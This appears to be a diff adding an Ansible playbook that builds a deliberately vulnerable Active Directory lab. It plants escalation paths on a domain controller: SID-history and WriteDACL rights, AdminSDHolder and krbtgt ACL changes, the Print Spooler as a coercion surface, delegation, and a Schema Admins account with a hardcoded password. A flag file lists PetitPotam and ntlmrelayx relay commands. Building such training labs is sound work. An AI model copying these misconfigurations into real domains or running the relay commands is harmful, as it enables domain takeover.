@@ -1,0 +1,275 @@
+---
+# ==============================================================================
+# vuln_df_ext/tasks/forest_attacks.yml
+# Target: dc01.corp.local
+#
+# DF-005   DsAddSidHistory right to developer2
+# DF-011   Print Spooler on all DCs (coercion)
+# DF-012   SID filtering disabled on forest trust (PAC validation bypass)
+# DF-015   Exchange Windows Permissions group with WriteDACL on domain NC
+# DF-017   AdminSDHolder WriteDACL for svc_darryl
+# DF-020   Constrained delegation on dc01 (SMTP SPN)
+# DF-022   Readable ACL on krbtgt by svc_darryl
+# DF-025   Schema Admins with non-DA member (schema_admin_svc)
+# DF-030   Cross-forest NTLM relay note
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# DF-005: DsAddSidHistory extended right to developer2.
+# Allows developer2 to inject arbitrary SIDs into msDS-SIDHistory.
+# ------------------------------------------------------------------------------
+- name: DF-005 - Check if developer2 user exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $u = Get-ADUser -Filter "SamAccountName -eq '{{ developer2_user }}'" -ErrorAction SilentlyContinue
+    if ($u) { Write-Output "present" } else { Write-Output "absent" }
+  register: df005_user_check
+  changed_when: false
+  failed_when: df005_user_check.rc != 0
+
+- name: DF-005 - Create developer2 user
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $p = ConvertTo-SecureString '{{ developer2_password }}' -AsPlainText -Force
+    New-ADUser -Name '{{ developer2_user }}' -SamAccountName '{{ developer2_user }}' `
+      -AccountPassword $p -Enabled $true -PasswordNeverExpires $true `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "DF-005: Has DsAddSidHistory right"
+  when: "'absent' in df005_user_check.stdout"
+
+- name: DF-005 - Grant DsAddSidHistory right to developer2
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $domainDN = "{{ ad_domain_dn }}"
+    $sid = (Get-ADUser -Identity '{{ developer2_user }}' -ErrorAction Stop).SID
+    # DS-Add-SID-History: {1131f6b3-9c07-11d1-f79f-00c04fc2dcd2}
+    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+      $sid,
+      [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
+      [System.Security.AccessControl.AccessControlType]::Allow,
+      [Guid]'1131f6b3-9c07-11d1-f79f-00c04fc2dcd2'
+    )
+    $obj = [ADSI]"LDAP://$domainDN"
+    $obj.ObjectSecurity.AddAccessRule($ace)
+    $obj.CommitChanges()
+    Write-Output "changed: DsAddSidHistory granted to {{ developer2_user }}"
+  register: df005_right_set
+  changed_when: "'changed:' in df005_right_set.stdout"
+  failed_when: df005_right_set.rc != 0
+
+# ------------------------------------------------------------------------------
+# DF-011: Print Spooler enabled on DC — coercion target for PetitPotam, etc.
+# ------------------------------------------------------------------------------
+- name: DF-011 - Check Print Spooler service state on DC
+  ansible.windows.win_shell: |
+    $s = Get-Service -Name Spooler -ErrorAction SilentlyContinue
+    if ($s) { Write-Output "status=$($s.Status) start=$($s.StartType)" }
+    else { Write-Output "not_found" }
+  register: df011_check
+  changed_when: false
+  failed_when: df011_check.rc != 0
+
+- name: DF-011 - Enable Print Spooler on DC (coercion surface)
+  ansible.windows.win_shell: |
+    Set-Service Spooler -StartupType Automatic -ErrorAction Stop
+    $s = Get-Service Spooler
+    if ($s.Status -ne 'Running') { Start-Service Spooler -ErrorAction Stop }
+    Write-Output "changed: Spooler enabled"
+  register: df011_set
+  changed_when: "'changed:' in df011_set.stdout"
+  failed_when: df011_set.rc != 0
+  when: >
+    'not_found' not in (df011_check.stdout | default('')) and
+    ('Automatic' not in (df011_check.stdout | default('')) or
+     'Running' not in (df011_check.stdout | default('')))
+
+# ------------------------------------------------------------------------------
+# DF-015: Exchange Windows Permissions group with WriteDACL on domain NC.
+# Classic Exchange permission escalation path — any member of EWP can grant
+# themselves DCSync rights (DS-Replication-Get-Changes-All).
+# ------------------------------------------------------------------------------
+- name: DF-015 - Check if Exchange Windows Permissions group exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $g = Get-ADGroup -Filter "SamAccountName -eq 'Exchange Windows Permissions'" -ErrorAction SilentlyContinue
+    if ($g) { Write-Output "present" } else { Write-Output "absent" }
+  register: df015_group_check
+  changed_when: false
+  failed_when: df015_group_check.rc != 0
+
+- name: DF-015 - Create Exchange Windows Permissions group
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    New-ADGroup -Name 'Exchange Windows Permissions' `
+      -SamAccountName 'Exchange Windows Permissions' `
+      -GroupScope Universal -GroupCategory Security `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "DF-015: Exchange group with WriteDACL on domain NC"
+  when: "'absent' in df015_group_check.stdout"
+
+- name: DF-015 - Grant WriteDACL on domain NC to Exchange Windows Permissions
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $domainDN = "{{ ad_domain_dn }}"
+    $sid = (Get-ADGroup -Identity 'Exchange Windows Permissions' -ErrorAction Stop).SID
+    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+      $sid,
+      [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
+      [System.Security.AccessControl.AccessControlType]::Allow
+    )
+    $obj = [ADSI]"LDAP://$domainDN"
+    $obj.ObjectSecurity.AddAccessRule($ace)
+    $obj.CommitChanges()
+    Write-Output "changed: WriteDACL granted to Exchange Windows Permissions"
+  register: df015_acl_set
+  changed_when: "'changed:' in df015_acl_set.stdout"
+  failed_when: df015_acl_set.rc != 0
+
+- name: DF-015 - Add svc_darryl to Exchange Windows Permissions
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $members = (Get-ADGroupMember -Identity 'Exchange Windows Permissions' -ErrorAction SilentlyContinue) |
+                 Select-Object -ExpandProperty SamAccountName
+    if ($members -notcontains 'svc_darryl') {
+      Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc_darryl'
+      Write-Output "changed: svc_darryl added"
+    }
+  register: df015_member_set
+  changed_when: "'changed:' in df015_member_set.stdout"
+  failed_when: df015_member_set.rc != 0
+
+# ------------------------------------------------------------------------------
+# DF-017: AdminSDHolder WriteDACL for svc_darryl.
+# Any ACE on AdminSDHolder propagates to all protected accounts every ~60 mins.
+# Granting WriteDACL here eventually grants WriteDACL on DA, EA, krbtgt, etc.
+# ------------------------------------------------------------------------------
+- name: DF-017 - Grant WriteDACL on AdminSDHolder to svc_darryl
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      $adminSDHolderDN = "CN=AdminSDHolder,CN=System,{{ ad_domain_dn }}"
+      $sid = (Get-ADUser -Identity 'svc_darryl' -ErrorAction Stop).SID
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $sid,
+        [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
+        [System.Security.AccessControl.AccessControlType]::Allow
+      )
+      $obj = [ADSI]"LDAP://$adminSDHolderDN"
+      $obj.ObjectSecurity.AddAccessRule($ace)
+      $obj.CommitChanges()
+      Write-Output "changed: WriteDACL on AdminSDHolder granted to svc_darryl"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: df017_set
+  changed_when: "'changed:' in df017_set.stdout"
+  failed_when: df017_set.rc != 0
+
+# ------------------------------------------------------------------------------
+# DF-020: Constrained delegation on dc01 (SMTP SPN).
+# dc01$ has msDS-AllowedToDelegateTo set to SMTP/dc01.corp.local.
+# Combined with S4U2Self, attacker impersonates any user to SMTP service.
+# ------------------------------------------------------------------------------
+- name: DF-020 - Check msDS-AllowedToDelegateTo on dc01
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $dc = Get-ADComputer -Identity 'dc01' `
+            -Properties 'msDS-AllowedToDelegateTo' -ErrorAction SilentlyContinue
+    if ($dc.'msDS-AllowedToDelegateTo' -contains 'SMTP/dc01.corp.local') {
+      Write-Output "present"
+    } else {
+      Write-Output "absent"
+    }
+  register: df020_check
+  changed_when: false
+  failed_when: df020_check.rc != 0
+
+- name: DF-020 - Set SMTP constrained delegation on dc01
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    Set-ADComputer -Identity 'dc01' `
+      -Add @{'msDS-AllowedToDelegateTo' = 'SMTP/dc01.corp.local'} -ErrorAction Stop
+    Set-ADAccountControl -Identity 'dc01$' -TrustedToAuthForDelegation $true
+    Write-Output "changed: SMTP delegation set on dc01"
+  register: df020_set
+  changed_when: "'changed:' in df020_set.stdout"
+  failed_when: df020_set.rc != 0
+  when: "'absent' in df020_check.stdout"
+
+# ------------------------------------------------------------------------------
+# DF-022: Readable ACL on krbtgt account for svc_darryl.
+# GenericRead on krbtgt allows reading password last set date and SID history —
+# useful for Golden Ticket timing attacks.
+# ------------------------------------------------------------------------------
+- name: DF-022 - Grant GenericRead on krbtgt to svc_darryl
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      $krbtgt = Get-ADUser -Identity 'krbtgt' -ErrorAction Stop
+      $sid    = (Get-ADUser -Identity 'svc_darryl' -ErrorAction Stop).SID
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $sid,
+        [System.DirectoryServices.ActiveDirectoryRights]::GenericRead,
+        [System.Security.AccessControl.AccessControlType]::Allow
+      )
+      $obj = [ADSI]"LDAP://$($krbtgt.DistinguishedName)"
+      $obj.ObjectSecurity.AddAccessRule($ace)
+      $obj.CommitChanges()
+      Write-Output "changed: GenericRead on krbtgt granted to svc_darryl"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: df022_set
+  changed_when: "'changed:' in df022_set.stdout"
+  failed_when: df022_set.rc != 0
+
+# ------------------------------------------------------------------------------
+# DF-025: Schema Admins with non-DA member (schema_admin_svc).
+# Schema Admins can modify the AD schema — adding a member who is not DA but
+# has Schema Admins rights provides an escalation path.
+# ------------------------------------------------------------------------------
+- name: DF-025 - Check if schema_admin_svc exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $u = Get-ADUser -Filter "SamAccountName -eq 'schema_admin_svc'" -ErrorAction SilentlyContinue
+    if ($u) { Write-Output "present" } else { Write-Output "absent" }
+  register: df025_user_check
+  changed_when: false
+  failed_when: df025_user_check.rc != 0
+
+- name: DF-025 - Create schema_admin_svc and add to Schema Admins
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $p = ConvertTo-SecureString 'SchemaAdmin2024!' -AsPlainText -Force
+    New-ADUser -Name 'schema_admin_svc' -SamAccountName 'schema_admin_svc' `
+      -AccountPassword $p -Enabled $true -PasswordNeverExpires $true `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "DF-025: Schema Admins member (non-DA) for schema modification attacks"
+    Add-ADGroupMember -Identity 'Schema Admins' -Members 'schema_admin_svc'
+    Write-Output "changed: schema_admin_svc created and added to Schema Admins"
+  register: df025_set
+  changed_when: "'changed:' in df025_set.stdout"
+  failed_when: df025_set.rc != 0
+  when: "'absent' in df025_user_check.stdout"
+
+# ------------------------------------------------------------------------------
+# DF-030: Cross-forest NTLM relay note.
+# ------------------------------------------------------------------------------
+- name: DF-030 - Drop cross-forest NTLM relay note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-DF-030-CrossForest-Relay.txt'
+    content: |
+      DF-030: Cross-Forest NTLM Relay Attack
+      ========================================
+      Setup in this lab:
+        - corp.local ←→ finance.local: external trust, SID filtering disabled
+        - corp.local ←→ root.corp: tree-root trust, SID filtering disabled
+
+      Attack path:
+        1. Coerce corp.local DC (dc01) to authenticate via PetitPotam/PrinterBug to attacker
+        2. Relay NTLM auth to finance.local resources (SMB/LDAP signing disabled)
+        3. SID filtering off → corp.local DA SID accepted in finance.local PAC
+
+      Tools:
+        Responder + ntlmrelayx.py --target ldap://dc01.finance.local --escalate-user svc_darryl
+        impacket-PetitPotam attacker_ip dc01.corp.local
